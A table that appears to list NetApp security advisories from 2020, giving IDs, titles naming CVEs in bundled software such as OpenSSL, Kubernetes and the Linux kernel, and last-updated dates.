| [**NTAP-20200918-0005**](https://security.netapp.com/advisory/ntap-20200918-0005/) | CVE-2020-7068 PHP Vulnerability in NetApp Products | 2020-10-27 |
| [**NTAP-20200918-0004**](https://security.netapp.com/advisory/ntap-20200918-0004/) | September 2020 Django Vulnerabilities in NetApp Products | 2020-11-17 |
| [**NTAP-20200911-0004**](https://security.netapp.com/advisory/ntap-20200911-0004/) | CVE-2020-1968 OpenSSL Vulnerability in NetApp Products | 2024-01-02 |
| [**NTAP-20200911-0006**](https://security.netapp.com/advisory/ntap-20200911-0006/) | CVE-2020-24659 GnuTLS Vulnerability in NetApp Products | 2022-03-07 |
| [**NTAP-20200911-0002**](https://security.netapp.com/advisory/ntap-20200911-0002/) | CVE-2020-8169 cURL/libcURL Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20200911-0001**](https://security.netapp.com/advisory/ntap-20200911-0001/) | CVE-2020-8177 cURL/libcURL Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20200911-0003**](https://security.netapp.com/advisory/ntap-20200911-0003/) | CVE-2020-8231 cURL/libcURL Vulnerability in NetApp Products | 2022-08-01 |
| [**NTAP-20200911-0005**](https://security.netapp.com/advisory/ntap-20200911-0005/) | CVE-2020-8758 Intel AMT Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20200904-0006**](https://security.netapp.com/advisory/ntap-20200904-0006/) | August 2020 FasterXML jackson-databind Vulnerabilities in NetApp Products | 2021-07-13 |
| [**NTAP-20200904-0001**](https://security.netapp.com/advisory/ntap-20200904-0001/) | August 2020 Net-SNMP Vulnerabilities in NetApp Products | 2022-05-27 |
| [**NTAP-20200904-0004**](https://security.netapp.com/advisory/ntap-20200904-0004/) | CVE-2018-1000873 FasterXML jackson-databind Vulnerability in NetApp Products | 2021-07-13 |
| [**NTAP-20200904-0005**](https://security.netapp.com/advisory/ntap-20200904-0005/) | CVE-2019-14892 FasterXML jackson-databind Vulnerability in NetApp Products | 2021-07-13 |
| [**NTAP-20200904-0002**](https://security.netapp.com/advisory/ntap-20200904-0002/) | CVE-2020-14356 Linux Kernel Vulnerability in NetApp Products | 2022-05-27 |
| [**NTAP-20200904-0003**](https://security.netapp.com/advisory/ntap-20200904-0003/) | CVE-2020-24394 Linux Kernel Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20200902-0001**](https://security.netapp.com/advisory/ntap-20200902-0001/) | CVE-2020-8576 Sensitive Information Disclosure Vulnerability in Clustered Data ONTAP | 2020-09-02 |
| [**NTAP-20200827-0003**](https://security.netapp.com/advisory/ntap-20200827-0003/) | August 2020 ISC BIND Vulnerabilities in NetApp Products | 2021-01-05 |
| [**NTAP-20200827-0004**](https://security.netapp.com/advisory/ntap-20200827-0004/) | CVE-2018-15173 Nmap Vulnerability in NetApp Products | 2020-08-27 |
| [**NTAP-20200827-0002**](https://security.netapp.com/advisory/ntap-20200827-0002/) | CVE-2020-11985 Apache HTTP Server Vulnerability in NetApp Products | 2020-09-01 |
| [**NTAP-20200827-0001**](https://security.netapp.com/advisory/ntap-20200827-0001/) | CVE-2020-7019 Elasticsearch Vulnerability in NetApp Products | 2021-03-03 |
| [**NTAP-20200821-0004**](https://security.netapp.com/advisory/ntap-20200821-0004/) | August 2020 Apache Struts 2.x Vulnerabilities in NetApp Products | 2020-09-17 |
| [**NTAP-20200821-0005**](https://security.netapp.com/advisory/ntap-20200821-0005/) | August 2020 FreeBSD Vulnerabilities in NetApp Products | 2020-08-21 |
| [**NTAP-20200821-0006**](https://security.netapp.com/advisory/ntap-20200821-0006/) | CVE-2020-16092 QEMU Vulnerability in NetApp Products | 2020-11-17 |
| [**NTAP-20200821-0003**](https://security.netapp.com/advisory/ntap-20200821-0003/) | CVE-2020-7699 Nodejs Vulnerability in NetApp Products | 2021-04-05 |
| [**NTAP-20200821-0002**](https://security.netapp.com/advisory/ntap-20200821-0002/) | CVE-2020-8557 Kubernetes Vulnerability in NetApp Products | 2020-08-21 |
| [**NTAP-20200821-0001**](https://security.netapp.com/advisory/ntap-20200821-0001/) | CVE-2020-8558 Kubernetes Vulnerability in NetApp Products | 2020-08-21 |
| [**NTAP-20200814-0005**](https://security.netapp.com/advisory/ntap-20200814-0005/) | August 2020 Apache HTTP Server Vulnerabilities in NetApp Products | 2021-06-14 |
| [**NTAP-20200814-0004**](https://security.netapp.com/advisory/ntap-20200814-0004/) | CVE-2020-16166 Linux Kernel Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20200814-0001**](https://security.netapp.com/advisory/ntap-20200814-0001/) | Intel SA-00367 Server Board Firmware Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20200814-0002**](https://security.netapp.com/advisory/ntap-20200814-0002/) | Intel SA-00384 Server Boards, Systems and Compute Module Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20200814-0003**](https://security.netapp.com/advisory/ntap-20200814-0003/) | Intel SA-00386 Server Board Firmware Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20200810-0003**](https://security.netapp.com/advisory/ntap-20200810-0003/) | CVE-2019-11255 Kubernetes Vulnerability in NetApp Products | 2021-03-15 |
| [**NTAP-20200810-0002**](https://security.netapp.com/advisory/ntap-20200810-0002/) | CVE-2020-11110 Grafana Vulnerability in NetApp Products | 2022-03-07 |
| [**NTAP-20200810-0001**](https://security.netapp.com/advisory/ntap-20200810-0001/) | CVE-2020-15852 Linux Kernel Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20200810-0004**](https://security.netapp.com/advisory/ntap-20200810-0004/) | CVE-2020-8559 Kubernetes Vulnerability in NetApp Products | 2020-08-10 |
| [**NTAP-20200803-0001**](https://security.netapp.com/advisory/ntap-20200803-0001/) | CVE-2020-8574 Unauthorized Code Execution Vulnerability in Active IQ Unified Manager for Linux 7.3 and above | 2020-08-03 |
| [**NTAP-20200803-0002**](https://security.netapp.com/advisory/ntap-20200803-0002/) | CVE-2020-8575 Denial of Service Vulnerability in Active IQ Unified Manager for VMware vSphere and Windows | 2020-08-03 |
| [**NTAP-20200731-0002**](https://security.netapp.com/advisory/ntap-20200731-0002/) | CVE-2019-20907 Python Vulnerability in NetApp Products | 2022-03-02 |
| [**NTAP-20200731-0001**](https://security.netapp.com/advisory/ntap-20200731-0001/) | CVE-2020-10761 QEMU Vulnerability in NetApp Products | 2020-07-31 |
| [**NTAP-20200731-0004**](https://security.netapp.com/advisory/ntap-20200731-0004/) | CVE-2020-14001 Ruby Vulnerability in NetApp Products | 2020-07-31 |
| [**NTAP-20200731-0006**](https://security.netapp.com/advisory/ntap-20200731-0006/) | CVE-2020-14725 MySQL Vulnerability in NetApp Products | 2021-01-19 |
| [**NTAP-20200731-0007**](https://security.netapp.com/advisory/ntap-20200731-0007/) | CVE-2020-15778 OpenSSH Vulnerability in NetApp Products | 2021-04-23 |
| [**NTAP-20200731-0003**](https://security.netapp.com/advisory/ntap-20200731-0003/) | CVE-2020-15801 Python Vulnerability in NetApp Products | 2021-05-19 |
| [**NTAP-20200731-0005**](https://security.netapp.com/advisory/ntap-20200731-0005/) | July 2020 Golang Vulnerabilities in NetApp Products | 2020-09-17 |
| [**NTAP-20200731-0008**](https://security.netapp.com/advisory/ntap-20200731-0008/) | July 2020 Grub2 Vulnerabilities in NetApp Products | 2022-02-28 |
| [**NTAP-20200724-0007**](https://security.netapp.com/advisory/ntap-20200724-0007/) | CVE-2020-10702 QEMU Vulnerability in NetApp Products | 2020-07-24 |
| [**NTAP-20200724-0004**](https://security.netapp.com/advisory/ntap-20200724-0004/) | CVE-2020-14422 Python Vulnerability in NetApp Products | 2021-05-19 |
| [**NTAP-20200724-0006**](https://security.netapp.com/advisory/ntap-20200724-0006/) | CVE-2020-8203 Lodash Vulnerability in NetApp Products | 2022-08-03 |
| [**NTAP-20200724-0005**](https://security.netapp.com/advisory/ntap-20200724-0005/) | CVE-2020-8555 Kubernetes Vulnerability in NetApp Products | 2020-11-17 |
| [**NTAP-20200724-0003**](https://security.netapp.com/advisory/ntap-20200724-0003/) | July 2020 Apache Tomcat Vulnerabilities in NetApp Products | 2021-01-04 |
| [**NTAP-20200724-0002**](https://security.netapp.com/advisory/ntap-20200724-0002/) | July 2020 FreeBSD Vulnerabilities in NetApp Products | 2020-07-24 |
| [**NTAP-20200724-0001**](https://security.netapp.com/advisory/ntap-20200724-0001/) | June 2020 Node.js Vulnerabilities in NetApp Products | 2021-04-05 |
| [**NTAP-20200717-0002**](https://security.netapp.com/advisory/ntap-20200717-0002/) | CVE-2020-13401 Docker Vulnerability in NetApp Products | 2021-06-22 |
| [**NTAP-20200717-0003**](https://security.netapp.com/advisory/ntap-20200717-0003/) | CVE-2020-14002 PuTTY Vulnerability in NetApp Products | 2021-02-12 |
| [**NTAP-20200717-0005**](https://security.netapp.com/advisory/ntap-20200717-0005/) | July 2020 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2022-11-21 |
| [**NTAP-20200717-0004**](https://security.netapp.com/advisory/ntap-20200717-0004/) | July 2020 MySQL Vulnerabilities in NetApp Products | 2021-06-23 |
| [**NTAP-20200717-0001**](https://security.netapp.com/advisory/ntap-20200717-0001/) | June 2020 QEMU Vulnerabilities in NetApp Products | 2020-07-17 |
| [**NTAP-20200709-0002**](https://security.netapp.com/advisory/ntap-20200709-0002/) | CVE-2020-11996 Apache Tomcat Vulnerability in NetApp Products | 2021-01-04 |
| [**NTAP-20200709-0004**](https://security.netapp.com/advisory/ntap-20200709-0004/) | CVE-2020-14145 OpenSSH Vulnerability in NetApp Products | 2023-11-17 |
| [**NTAP-20200709-0003**](https://security.netapp.com/advisory/ntap-20200709-0003/) | CVE-2020-14303 Samba Vulnerability in NetApp Products | 2020-07-09 |
| [**NTAP-20200709-0001**](https://security.netapp.com/advisory/ntap-20200709-0001/) | CVE-2020-15358 SQLite Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20200702-0004**](https://security.netapp.com/advisory/ntap-20200702-0004/) | CVE-2020-10757 Linux Kernel Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20200702-0006**](https://security.netapp.com/advisory/ntap-20200702-0006/) | CVE-2020-12662 Unbound Vulnerability in NetApp Products | 2020-07-02 |
| [**NTAP-20200702-0002**](https://security.netapp.com/advisory/ntap-20200702-0002/) | CVE-2020-15025 Network Time Protocol Daemon (ntpd) Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20200702-0003**](https://security.netapp.com/advisory/ntap-20200702-0003/) | June 2020 FasterXML jackson-databind Vulnerabilities in NetApp Products | 2021-07-13 |
| [**NTAP-20200702-0005**](https://security.netapp.com/advisory/ntap-20200702-0005/) | June 2020 Libxml2 Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20200702-0001**](https://security.netapp.com/advisory/ntap-20200702-0001/) | June 2020 Samba Vulnerabilities in NetApp Products | 2020-07-02 |
| [**NTAP-20200626-0001**](https://security.netapp.com/advisory/ntap-20200626-0001/) | CVE-2020-8573 Default Account Vulnerability in the NetApp HCI Baseboard Management Controller (BMC) - H610C, H615C and H610S | 2020-10-01 |
| [**NTAP-20200625-0001**](https://security.netapp.com/advisory/ntap-20200625-0001/) | CVE-2020-10933 Ruby Vulnerability in NetApp Products | 2020-06-30 |
| [**NTAP-20200625-0004**](https://security.netapp.com/advisory/ntap-20200625-0004/) | CVE-2020-13817 NTP Vulnerability in NetApp Products | 2022-08-26 |
| [**NTAP-20200625-0005**](https://security.netapp.com/advisory/ntap-20200625-0005/) | CVE-2020-7456 FreeBSD Vulnerability in NetApp Products | 2021-11-25 |
| [**NTAP-20200625-0002**](https://security.netapp.com/advisory/ntap-20200625-0002/) | CVE-2020-8172 Nodejs Vulnerability in NetApp Products | 2021-04-05 |
| [**NTAP-20200625-0003**](https://security.netapp.com/advisory/ntap-20200625-0003/) | June 2020 ISC BIND Vulnerabilities in NetApp Products | 2021-01-05 |
| [**NTAP-20200625-0006**](https://security.netapp.com/advisory/ntap-20200625-0006/) | June 2020 Treck TCP/IP Library Vulnerabilities in NetApp Products | 2020-07-22 |
| [**NTAP-20200619-0001**](https://security.netapp.com/advisory/ntap-20200619-0001/) | CVE-2019-20806 Linux Kernel Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20200619-0005**](https://security.netapp.com/advisory/ntap-20200619-0005/) | CVE-2020-13692 PostgreSQL Vulnerability in NetApp Products | 2021-03-03 |
| [**NTAP-20200619-0006**](https://security.netapp.com/advisory/ntap-20200619-0006/) | CVE-2020-13765 QEMU Vulnerability in NetApp Products | 2020-06-19 |
| [**NTAP-20200619-0004**](https://security.netapp.com/advisory/ntap-20200619-0004/) | CVE-2020-13777 GnuTLS Vulnerability in NetApp Products | 2020-07-17 |
| [**NTAP-20200619-0002**](https://security.netapp.com/advisory/ntap-20200619-0002/) | CVE-2020-13871 SQLite Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20200619-0003**](https://security.netapp.com/advisory/ntap-20200619-0003/) | CVE-2020-7014 Elasticsearch Vulnerability in NetApp Products | 2021-03-03 |
| [**NTAP-20200611-0003**](https://security.netapp.com/advisory/ntap-20200611-0003/) | CVE-2020-13776 Systemd Vulnerability in NetApp Products | 2022-05-27 |
| [**NTAP-20200611-0007**](https://security.netapp.com/advisory/ntap-20200611-0007/) | Intel SA-00295 AMT Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20200611-0006**](https://security.netapp.com/advisory/ntap-20200611-0006/) | Intel SA-00295 CSME Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20200611-0004**](https://security.netapp.com/advisory/ntap-20200611-0004/) | Intel SA-00295 SPS Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20200611-0005**](https://security.netapp.com/advisory/ntap-20200611-0005/) | Intel SA-00295 TXE Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20200611-0002**](https://security.netapp.com/advisory/ntap-20200611-0002/) | June 2020 Django Vulnerabilities in NetApp Products | 2021-12-10 |
| [**NTAP-20200611-0001**](https://security.netapp.com/advisory/ntap-20200611-0001/) | June 2020 Perl Vulnerabilities in NetApp Products | 2022-08-29 |
| [**NTAP-20200608-0005**](https://security.netapp.com/advisory/ntap-20200608-0005/) | CVE-2020-10703 Libvirt Vulnerability in NetApp Products | 2020-06-08 |
| [**NTAP-20200608-0006**](https://security.netapp.com/advisory/ntap-20200608-0006/) | CVE-2020-13379 Grafana Vulnerability in NetApp Products | 2020-06-18 |
| [**NTAP-20200608-0004**](https://security.netapp.com/advisory/ntap-20200608-0004/) | CVE-2020-13645 GNOME GLib Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20200608-0008**](https://security.netapp.com/advisory/ntap-20200608-0008/) | June 2020 Grafana Vulnerabilities in NetApp Products | 2020-06-18 |
| [**NTAP-20200608-0003**](https://security.netapp.com/advisory/ntap-20200608-0003/) | June 2020 QEMU Vulnerabilities in NetApp Products | 2020-06-08 |
| [**NTAP-20200608-0007**](https://security.netapp.com/advisory/ntap-20200608-0007/) | June 2020 QEMU Vulnerabilities in NetApp Products | 2020-06-08 |
| [**NTAP-20200608-0002**](https://security.netapp.com/advisory/ntap-20200608-0002/) | June 2020 SQLite Vulnerabilities in NetApp Products | 2022-05-27 |
| [**NTAP-20200608-0001**](https://security.netapp.com/advisory/ntap-20200608-0001/) | May 2020 Linux Kernel Vulnerabilities in NetApp Products | 2023-02-07 |
| [**NTAP-20200528-0006**](https://security.netapp.com/advisory/ntap-20200528-0006/) | CVE-2019-11048 PHP Vulnerability in NetApp Products | 2020-06-18 |
| [**NTAP-20200528-0002**](https://security.netapp.com/advisory/ntap-20200528-0002/) | CVE-2020-13388 Python Vulnerability in NetApp Products | 2021-05-19 |
| [**NTAP-20200528-0003**](https://security.netapp.com/advisory/ntap-20200528-0003/) | CVE-2020-13430 Grafana Vulnerability in NetApp Products | 2020-06-16 |
| [**NTAP-20200528-0001**](https://security.netapp.com/advisory/ntap-20200528-0001/) | CVE-2020-7656 jQuery Vulnerability in NetApp Products | 2024-01-02 |
| [**NTAP-20200528-0005**](https://security.netapp.com/advisory/ntap-20200528-0005/) | CVE-2020-9484 Apache Tomcat Vulnerability in NetApp Products | 2021-01-04 |
| [**NTAP-20200528-0004**](https://security.netapp.com/advisory/ntap-20200528-0004/) | May 2020 SQLite Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20200522-0001**](https://security.netapp.com/advisory/ntap-20200522-0001/) | CVE-2020-5895 NGINX Vulnerability in NetApp Products | 2024-01-02 |
| [**NTAP-20200522-0002**](https://security.netapp.com/advisory/ntap-20200522-0002/) | May 2020 ISC BIND Vulnerabilities in NetApp Products | 2020-09-01 |
| [**NTAP-20200520-0001**](https://security.netapp.com/advisory/ntap-20200520-0001/) | CVE-2020-8572 Sensitive Information Disclosure Vulnerability in Element OS and Element HealthTools | 2020-05-20 |
| [**NTAP-20200518-0006**](https://security.netapp.com/advisory/ntap-20200518-0006/) | CVE-2018-8956 Network Time Protocol Daemon (ntpd) Vulnerability in NetApp Products | 2022-05-27 |
| [**NTAP-20200518-0007**](https://security.netapp.com/advisory/ntap-20200518-0007/) | CVE-2019-15878 FreeBSD Vulnerability in NetApp Products | 2020-05-22 |
| [**NTAP-20200518-0008**](https://security.netapp.com/advisory/ntap-20200518-0008/) | CVE-2019-15880 FreeBSD Vulnerability in NetApp Products | 2020-05-22 |
| [**NTAP-20200518-0002**](https://security.netapp.com/advisory/ntap-20200518-0002/) | CVE-2020-10683 Dom4j Vulnerability in NetApp Products | 2021-11-26 |
| [**NTAP-20200518-0003**](https://security.netapp.com/advisory/ntap-20200518-0003/) | CVE-2020-12430 Libvirt Vulnerability in NetApp Products | 2020-05-18 |
| [**NTAP-20200518-0001**](https://security.netapp.com/advisory/ntap-20200518-0001/) | CVE-2020-12458 Grafana Vulnerability in NetApp Products | 2020-05-18 |
| [**NTAP-20200518-0004**](https://security.netapp.com/advisory/ntap-20200518-0004/) | CVE-2020-12459 Grafana Vulnerability in NetApp Products | 2020-05-26 |
| [**NTAP-20200518-0005**](https://security.netapp.com/advisory/ntap-20200518-0005/) | May 2020 FreeBSD Vulnerabilities in NetApp Products | 2020-05-22 |
| [**NTAP-20200511-0008**](https://security.netapp.com/advisory/ntap-20200511-0008/) | CVE-2019-16203 Brocade Fabric Operating System Firmware Vulnerability | 2020-05-11 |
| [**NTAP-20200511-0007**](https://security.netapp.com/advisory/ntap-20200511-0007/) | CVE-2019-16204 Brocade Fabric Operating System Firmware Vulnerability | 2020-05-11 |
| [**NTAP-20200511-0003**](https://security.netapp.com/advisory/ntap-20200511-0003/) | CVE-2020-12243 OpenLDAP Vulnerability in NetApp Products | 2023-08-02 |
| [**NTAP-20200511-0005**](https://security.netapp.com/advisory/ntap-20200511-0005/) | CVE-2020-1752 GNU C Vulnerability in NetApp Products | 2023-02-07 |
| [**NTAP-20200511-0004**](https://security.netapp.com/advisory/ntap-20200511-0004/) | May 2020 FasterXML jackson-databind Vulnerabilities in NetApp Products | 2020-12-02 |
| [**NTAP-20200511-0002**](https://security.netapp.com/advisory/ntap-20200511-0002/) | May 2020 FreeBSD Vulnerabilities in NetApp Products | 2021-10-28 |
| [**NTAP-20200511-0001**](https://security.netapp.com/advisory/ntap-20200511-0001/) | May 2020 Grafana Vulnerabilities in NetApp Products | 2020-06-16 |
| [**NTAP-20200511-0006**](https://security.netapp.com/advisory/ntap-20200511-0006/) | May 2020 jQuery Vulnerabilities in NetApp Products | 2024-01-02 |
| [**NTAP-20200507-0001**](https://security.netapp.com/advisory/ntap-20200507-0001/) | CVE-2018-5493 Denial of Service (DoS) vulnerability in ATTO FibreBridge 7500N | 2020-05-07 |
| [**NTAP-20200504-0002**](https://security.netapp.com/advisory/ntap-20200504-0002/) | CVE-2019-4729 IBM Cognos Analytics Vulnerability in NetApp Products | 2020-12-11 |
| [**NTAP-20200504-0001**](https://security.netapp.com/advisory/ntap-20200504-0001/) | CVE-2020-7067 PHP Vulnerability in NetApp Products | 2020-05-04 |
| [**NTAP-20200504-0003**](https://security.netapp.com/advisory/ntap-20200504-0003/) | CVE-2020-9488 Apache Log4j Vulnerability in NetApp Products | 2021-07-13 |
| [**NTAP-20200430-0004**](https://security.netapp.com/advisory/ntap-20200430-0004/) | April 2020 Linux Kernel Vulnerabilities in NetApp Products | 2024-05-01 |
| [**NTAP-20200430-0005**](https://security.netapp.com/advisory/ntap-20200430-0005/) | April 2020 NGINX Vulnerabilities in NetApp Products | 2024-01-02 |
| [**NTAP-20200430-0003**](https://security.netapp.com/advisory/ntap-20200430-0003/) | CVE-2019-18276 GNU Bash Vulnerability in NetApp Products | 2023-02-07 |
| [**NTAP-20200430-0001**](https://security.netapp.com/advisory/ntap-20200430-0001/) | CVE-2020-11669 Linux Kernel Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20200430-0002**](https://security.netapp.com/advisory/ntap-20200430-0002/) | CVE-2020-1751 GNU C Library (glibc) Vulnerability in NetApp Products | 2023-02-07 |
| [**NTAP-20200429-0001**](https://security.netapp.com/advisory/ntap-20200429-0001/) | April 2020 Samba Vulnerabilities in NetApp Products | 2020-04-29 |
| [**NTAP-20200424-0002**](https://security.netapp.com/advisory/ntap-20200424-0002/) | CVE-2020-11868 NTP Vulnerability in NetApp Products | 2022-08-26 |
| [**NTAP-20200424-0001**](https://security.netapp.com/advisory/ntap-20200424-0001/) | CVE-2020-1730 Libssh Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20200424-0003**](https://security.netapp.com/advisory/ntap-20200424-0003/) | CVE-2020-1967 OpenSSL Vulnerability in NetApp Products | 2024-01-02 |
| [**NTAP-20200416-0004**](https://security.netapp.com/advisory/ntap-20200416-0004/) | April 2020 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2022-11-21 |
| [**NTAP-20200416-0003**](https://security.netapp.com/advisory/ntap-20200416-0003/) | April 2020 MySQL Vulnerabilities in NetApp Products | 2021-02-10 |
| [**NTAP-20200416-0001**](https://security.netapp.com/advisory/ntap-20200416-0001/) | April 2020 SQLite Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20200416-0002**](https://security.netapp.com/advisory/ntap-20200416-0002/) | CVE-2020-11501 GnuTLS Vulnerability in NetApp Products | 2020-06-25 |
| [**NTAP-20200413-0002**](https://security.netapp.com/advisory/ntap-20200413-0002/) | April 2020 Apache HTTP Server Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20200413-0003**](https://security.netapp.com/advisory/ntap-20200413-0003/) | April 2020 Kubernetes Vulnerabilities in NetApp Products | 2020-11-17 |
| [**NTAP-20200413-0001**](https://security.netapp.com/advisory/ntap-20200413-0001/) | March 2020 FreeBSD Vulnerabilities in NetApp Products | 2021-01-15 |
| [**NTAP-20200403-0002**](https://security.netapp.com/advisory/ntap-20200403-0002/) | April 2020 FasterXML jackson-databind Vulnerabilities in NetApp Products | 2020-12-08 |
| [**NTAP-20200403-0003**](https://security.netapp.com/advisory/ntap-20200403-0003/) | CVE-2020-10942 Linux Kernel Vulnerability in NetApp Products | 2022-05-27 |
| [**NTAP-20200403-0004**](https://security.netapp.com/advisory/ntap-20200403-0004/) | CVE-2020-7009 Elasticsearch Vulnerability in NetApp Products | 2020-04-06 |
| [**NTAP-20200403-0001**](https://security.netapp.com/advisory/ntap-20200403-0001/) | March 2020 PHP Vulnerabilities in NetApp Products | 2020-04-03 |
| [**NTAP-20200330-0001**](https://security.netapp.com/advisory/ntap-20200330-0001/) | CVE-2015-2992 Apache Struts Vulnerability in NetApp Products | 2020-09-17 |
| [**NTAP-20200327-0007**](https://security.netapp.com/advisory/ntap-20200327-0007/) | CVE-2019-14887 Wildfly Vulnerability in NetApp Products | 2020-05-26 |
| [**NTAP-20200327-0006**](https://security.netapp.com/advisory/ntap-20200327-0006/) | CVE-2019-14893 FasterXML jackson-databind Vulnerability in NetApp Products | 2020-11-27 |
| [**NTAP-20200327-0003**](https://security.netapp.com/advisory/ntap-20200327-0003/) | CVE-2020-10029 GNU C Vulnerability in NetApp Products | 2023-02-07 |
| [**NTAP-20200327-0001**](https://security.netapp.com/advisory/ntap-20200327-0001/) | CVE-2020-7919 Golang Vulnerability in NetApp Products | 2020-10-19 |
| [**NTAP-20200327-0002**](https://security.netapp.com/advisory/ntap-20200327-0002/) | CVE-2020-8840 FasterXML jackson-databind Vulnerability in NetApp Products | 2021-02-01 |
| [**NTAP-20200327-0004**](https://security.netapp.com/advisory/ntap-20200327-0004/) | CVE-2020-9402 Django Vulnerability in NetApp Products | 2020-09-01 |
| [**NTAP-20200327-0005**](https://security.netapp.com/advisory/ntap-20200327-0005/) | February 2020 Apache Tomcat Vulnerabilities in NetApp Products | 2021-01-04 |
| [**NTAP-20200323-0001**](https://security.netapp.com/advisory/ntap-20200323-0001/) | CVE-2019-17276 Cross-Site Scripting Vulnerability in OnCommand System Manager 9.x | 2020-03-23 |
| [**NTAP-20200320-0005**](https://security.netapp.com/advisory/ntap-20200320-0005/) | Intel SA-00242 Graphics Drivers Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20200320-0004**](https://security.netapp.com/advisory/ntap-20200320-0004/) | Intel SA-00260 Intel Graphics Drivers Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20200320-0003**](https://security.netapp.com/advisory/ntap-20200320-0003/) | Intel SA-00315 Intel Graphics Drivers Vulnerabilities in NetApp Products | 2020-03-20 |
| [**NTAP-20200320-0001**](https://security.netapp.com/advisory/ntap-20200320-0001/) | Intel SA-00330 Intel Processor Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20200320-0002**](https://security.netapp.com/advisory/ntap-20200320-0002/) | Intel SA-00334 Intel Processor Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20200313-0001**](https://security.netapp.com/advisory/ntap-20200313-0001/) | CVE-2020-8441 JYaml Vulnerability in NetApp Products | 2021-11-26 |
| [**NTAP-20200313-0005**](https://security.netapp.com/advisory/ntap-20200313-0005/) | CVE-2020-8571 Denial of Service Vulnerability in StorageGRID (formerly StorageGRID Webscale) | 2020-03-13 |
| [**NTAP-20200313-0004**](https://security.netapp.com/advisory/ntap-20200313-0004/) | CVE-2020-8597 PPP Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20200313-0002**](https://security.netapp.com/advisory/ntap-20200313-0002/) | CVE-2020-9327 SQLite Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20200313-0003**](https://security.netapp.com/advisory/ntap-20200313-0003/) | February 2020 Linux Kernel Vulnerabilities in NetApp Products | 2022-05-27 |
| [**NTAP-20200226-0001**](https://security.netapp.com/advisory/ntap-20200226-0001/) | CVE-2019-17274 Default Privileged Account Vulnerability in the NetApp FAS 8300/8700 and AFF A400 Baseboard Management Controller | 2020-02-26 |
| [**NTAP-20200226-0003**](https://security.netapp.com/advisory/ntap-20200226-0003/) | CVE-2019-17275 Arbitrary Code Execution Vulnerability in OnCommand Cloud Manager | 2020-02-26 |
| [**NTAP-20200226-0002**](https://security.netapp.com/advisory/ntap-20200226-0002/) | CVE-2020-1938 Apache Tomcat Vulnerability in NetApp Products | 2021-01-04 |
| [**NTAP-20200221-0003**](https://security.netapp.com/advisory/ntap-20200221-0003/) | CVE-2019-9674 Python Vulnerability in NetApp Products | 2023-02-07 |
| [**NTAP-20200221-0006**](https://security.netapp.com/advisory/ntap-20200221-0006/) | CVE-2020-7471 Django Vulnerability in NetApp Products | 2020-09-01 |
| [**NTAP-20200221-0001**](https://security.netapp.com/advisory/ntap-20200221-0001/) | CVE-2020-8492 Python Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20200221-0004**](https://security.netapp.com/advisory/ntap-20200221-0004/) | February 2020 Node.js Vulnerabilities in NetApp Products | 2020-04-02 |
| [**NTAP-20200221-0002**](https://security.netapp.com/advisory/ntap-20200221-0002/) | February 2020 PHP Vulnerabilities in NetApp Products | 2020-02-21 |
| [**NTAP-20200221-0005**](https://security.netapp.com/advisory/ntap-20200221-0005/) | Intel SA-00307 Processor Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20200210-0001**](https://security.netapp.com/advisory/ntap-20200210-0001/) | CVE-2019-18634 Sudo Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20200210-0002**](https://security.netapp.com/advisory/ntap-20200210-0002/) | CVE-2019-20386 Systemd Vulnerability in NetApp Products | 2023-02-07 |
| [**NTAP-20200210-0003**](https://security.netapp.com/advisory/ntap-20200210-0003/) | February 2020 FreeBSD Vulnerabilities in NetApp Products | 2020-02-11 |
| [**NTAP-20200210-0004**](https://security.netapp.com/advisory/ntap-20200210-0004/) | Intel SA-00329 Processor Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20200204-0001**](https://security.netapp.com/advisory/ntap-20200204-0001/) | CVE-2019-19959 SQLite Vulnerability in NetApp Products | 2022-01-06 |
| [**NTAP-20200204-0002**](https://security.netapp.com/advisory/ntap-20200204-0002/) | January 2020 Linux Kernel Vulnerabilities in NetApp Products | 2022-05-27 |
| [**NTAP-20200204-0003**](https://security.netapp.com/advisory/ntap-20200204-0003/) | January 2020 NTP Vulnerabilities in NetApp Products | 2022-01-06 |
| [**NTAP-20200129-0001**](https://security.netapp.com/advisory/ntap-20200129-0001/) | CVE-2019-17273 IPv6 Denial of Service Vulnerability in E-Series SANtricity OS Controller Software 11.60.0 | 2020-01-29 |
| [**NTAP-20200127-0002**](https://security.netapp.com/advisory/ntap-20200127-0002/) | CVE-2019-15601 cURL/libcURL Vulnerability in NetApp Products | 2022-01-06 |
